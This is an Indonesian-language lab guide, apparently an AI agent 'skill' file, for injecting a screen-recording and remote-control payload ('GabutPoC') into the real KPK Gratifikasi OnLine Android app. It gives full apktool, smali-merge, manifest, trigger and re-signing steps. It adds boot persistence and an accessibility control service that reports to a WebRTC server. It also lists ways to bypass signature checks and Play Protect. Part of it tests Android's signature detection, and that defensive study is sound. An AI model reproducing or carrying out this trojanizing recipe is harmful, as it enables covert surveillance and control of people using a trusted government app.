---
name: lab2-apk-injection
description: Panduan skill untuk APK injection — menanam GabutPoC ke dalam GOL APK dan menguji sign detection Android. Mencakup repackage (apktool), merge smali, update manifest, sign ulang, dan test instalasi.
---

# APK Injection & Sign Detection

## Tujuan

Menanam **GabutPoC** (screen recording + remote control via WebRTC) ke **GOL APK** (Gratifikasi OnLine milik KPK — `com.kpk.gol` v2.1.1, Cordova/Ionic + Firebase), lalu menguji mekanisme **sign detection Android** saat APK termodifikasi di-install sebagai update.

## Arsitektur Sistem

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         GOL APK (Trojan Horse)                          │
│  ┌───────────────────────────┐  ┌────────────────────────────────────┐  │
│  │     GOL (Ionic/Cordova)   │  │         GabutPoC (Payload)         │  │
│  │                           │  │                                    │  │
│  │  MainActivity (Cordova)   │  │  ScreenCaptureService              │  │
│  │  WebView (Quasar/Vue SPA) │  │  KioskControlService (Access.)     │  │
│  │  Firebase Services        │  │  WhipClient + DeviceId             │  │
│  │  Cordova Plugins          │  │  BootReceiver                      │  │
│  └───────────────────────────┘  │  ForcedH264EncoderFactory          │  │
│                                  └──────────────┬─────────────────────┘  │
│                                                  │                        │
│  ┌───────────────────────────────────────────────┼──────────────────────┐│
│  │              AndroidManifest.xml              │                      ││
│  │  GOL perms + GabutPoC perms + services + rcvr │                      ││
│  └───────────────────────────────────────────────┼──────────────────────┘│
└──────────────────────────────────────────────────┼───────────────────────┘
                                                    │
                    ┌───────────────────────────────┼───────────────────┐
                    │           Server (10.103.105.79)                  │
                    │  ┌──────────┐  ┌──────────┐  ┌────────────────┐  │
                    │  │   SRS    │  │  Relay   │  │  Dashboard     │  │
                    │  │ :1985    │  │ :8092 WS │  │  :8088         │  │
                    │  │ :8000/UDP│  └──────────┘  └────────────────┘  │
                    └──────────────────────────────────────────────────┘
```

## Prasyarat

| Tool | Fungsi |
|------|--------|
| `apktool` | Unpack/repack APK |
| `jadx` | Decompile APK ke Java (analisis) |
| `keytool` | Cek certificate APK |
| `apksigner` / `jarsigner` | Sign APK pasca repackage |
| `adb` | Install APK ke emulator/device |
| Android SDK build-tools | Build tools |
| Docker Desktop | Server SRS + relay + dashboard |
| PowerShell 5.1 | Tools ekstraksi & sign check |

## Struktur Direktori

| File/Folder | Isi |
|-------------|-----|
| `docs/GabutPoC.md` | Dokumentasi lengkap arsitektur GabutPoC (7 komponen, server, WHIP flow) |
| `docs/GOL-APK.md` | Analisis APK GOL (Cordova, Firebase, struktur, titik injeksi) |
| `docs/injection.md` | Teknik injeksi detail (3 metode, langkah per langkah, sign detection) |
| `tools/extract-apk.ps1` | Ekstrak APK dari file XAPK |
| `tools/sign-check.ps1` | Bandingkan signature + hash + test instalasi |
| `skills/apk-inject.yaml` | Skill YAML untuk injeksi (unpack → merge → repack → sign) |
| `skills/sign-check.yaml` | Skill YAML untuk pengecekan signature |
| `com.kpk.gol.apk` | Target APK GOL (asli) |
| `../Lab-1/android/` | Source GabutPoC (Kotlin) |

## Langkah Injeksi

### Fase 1: Analisis Target

```bash
# Extract GOL APK dari XAPK
.\tools\extract-apk.ps1 -XapkPath com.kpk.gol.xapk

# Decompile dengan jadx
jadx-gui com.kpk.gol.apk
# Hasil: MainActivity extends CordovaActivity, min SDK 23, target 35

# Cek struktur
unzip -l com.kpk.gol.apk | grep -E "\.dex$|AndroidManifest|assets/www/"
# → classes.dex, classes2.dex
```

### Fase 2: Build GabutPoC

```bash
cd ../Lab-1/android
./gradlew assembleDebug
# Output: app/build/outputs/apk/debug/app-x86_64-debug.apk
```

### Fase 3: Unpack APK

```bash
# Target GOL
java -jar apktool.jar d com.kpk.gol.apk -o gol_unpacked -f

# Payload GabutPoC
java -jar apktool.jar d app-x86_64-debug.apk -o gabutpoc_unpacked -f
```

### Fase 4: Integrasi Kode

**A. Copy smali GabutPoC ke GOL:**
```bash
cp -r gabutpoc_unpacked/smali/com/example/screenwhip \
      gol_unpacked/smali/com/example/screenwhip/
cp gabutpoc_unpacked/smali/org/webrtc/ForcedH264Encoder* \
      gol_unpacked/smali/org/webrtc/
```

**B. Copy resource:**
```bash
cp gabutpoc_unpacked/res/xml/accessibility_service_config.xml \
      gol_unpacked/res/xml/
```

**C. Update AndroidManifest.xml:**
```xml
<!-- Tambah ke <manifest> -->
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

<!-- Tambah ke <application> -->
<service android:name="com.example.screenwhip.ScreenCaptureService"
    android:exported="false" android:foregroundServiceType="mediaProjection" />

<service android:name="com.example.screenwhip.KioskControlService"
    android:exported="true"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>
    <meta-data android:name="android.accessibilityservice"
        android:resource="@xml/accessibility_service_config" />
</service>

<receiver android:name="com.example.screenwhip.BootReceiver" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
        <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
    </intent-filter>
</receiver>
```

**D. Trigger di MainActivity smali:**
```smali
# Cari metode onCreate() di MainActivity.smali (com.kpk.gol)
# Setelah invoke-virtual {p0}, Lorg/apache/cordova/CordovaActivity;->loadUrl(Ljava/lang/String;)V
# Tambah:
    invoke-static {p0}, Lcom/example/screenwhip/BootReceiver;->scheduleStart(Landroid/content/Context;)V
```

### Fase 5: Repackage & Sign

```bash
# Repackage
java -jar apktool.jar b gol_unpacked -o gol_modified.apk

# Sign dengan debug key
apksigner sign --ks ~/.android/debug.keystore \
    --ks-pass pass:android --key-pass pass:android \
    --v2-signing-enabled true --v3-signing-enabled true \
    gol_modified.apk

# Verify signature
apksigner verify --verbose gol_modified.apk
```

### Fase 6: Test Sign Detection

```bash
# Gunakan sign-check.ps1
.\tools\sign-check.ps1 -OriginalApk com.kpk.gol.apk `
    -ModifiedApk gol_modified.apk -Compare -InstallTest

# Atau manual:

# 1. Cek certificate original
keytool -printcert -jarfile com.kpk.gol.apk | findstr "Owner:"

# 2. Cek certificate modified
keytool -printcert -jarfile gol_modified.apk | findstr "Owner:"
# Hasil: Owner: CN=Android Debug, O=Android, C=US (BERBEDA)

# 3. Install original
adb install com.kpk.gol.apk
# → Success

# 4. Update dengan modified (sign detection test)
adb install -r gol_modified.apk
# → INSTALL_FAILED_UPDATE_INCOMPATIBLE: Package signatures do not match

# 5. Uninstall original → install modified fresh
adb uninstall com.kpk.gol
adb install gol_modified.apk
# → Success (debug sign)
```

## Mekanisme Sign Detection Android

### Bagaimana Android Mendeteksi Perubahan Signature

| Mekanisme | Cara Kerja |
|-----------|------------|
| **APK Signature Scheme v2/v3** | Blok signature di APK diverifikasi saat install |
| **Package Manager** | Bandingkan signing certificate dengan APK yang sudah terinstall |
| **Play Integrity API** | Bandingkan signing certificate dengan Play Store record |
| **Play Protect** | Heuristic detection: screen capture + accessibility = spyware |

### Expected Results

| Test | Expected | Alasan |
|------|----------|--------|
| Install GOL asli | Success | Signature match dengan signing key KPK |
| Install modified (update) | **INSTALL_FAILED_UPDATE_INCOMPATIBLE** | Signature mismatch — original signed by KPK, modified signed by debug key |
| Install modified fresh | Success | Debug key valid untuk fresh install di device developer |
| Play Protect scan | **Flag as spyware** | Screen capture + accessibility = indikasi spyware |
| Google Play Integrity | Failed | Signature tidak match dengan Play Store record |

### Response System

**INSTALL_FAILED_UPDATE_INCOMPATIBLE:**
```
Error: INSTALL_FAILED_UPDATE_INCOMPATIBLE:
Package com.kpk.gol signatures do not match previously installed version
```

**Logcat:**
```
PackageManager: Signature mismatch for package com.kpk.gol
PackageManager: INSTALL_FAILED_UPDATE_INCOMPATIBLE
```

**Play Protect Warning:**
```
Play Protect has blocked an app that may collect personal data
This app may try to record your screen without your knowledge
```

### Bypass Signature Check (Informasi Lab)

| Bypass | Cara | Catatan |
|--------|------|---------|
| Uninstall dulu | `adb uninstall com.kpk.gol` | Data laporan hilang |
| Root + disable verify | `settings put global verifier_verify_adb_installs 0` | Butuh root |
| MDM managed install | Via enterprise policy | Butuh MDM |
| Custom ROM | Nonaktifkan signature verification | Advanced |

## Port Reference

| Port | Service | Protocol |
|------|---------|----------|
| 1985 | WHIP/WHEP API (SRS) | TCP |
| 8000 | WebRTC media | UDP |
| 8088 | Dashboard web | TCP |
| 8092 | Control relay WS | TCP |
| 8091 | Device HTTP control | TCP |

## Troubleshooting

| Masalah | Solusi |
|---------|--------|
| `INSTALL_FAILED_NO_MATCHING_ABIS` | Gabung native libs (.so) dari GabutPoC ke GOL |
| `INSTALL_FAILED_UPDATE_INCOMPATIBLE` | Uninstall dulu APK asli |
| Play Protect blokir install | Settings → Play Protect → matikan scan |
| App crash di startup | `adb logcat -s AndroidRuntime` cek stack trace |
| apktool gagal repackage | Cek error sintaks di AndroidManifest.xml |
| Resource not found | Pastikan accessibility_service_config.xml tercopy |
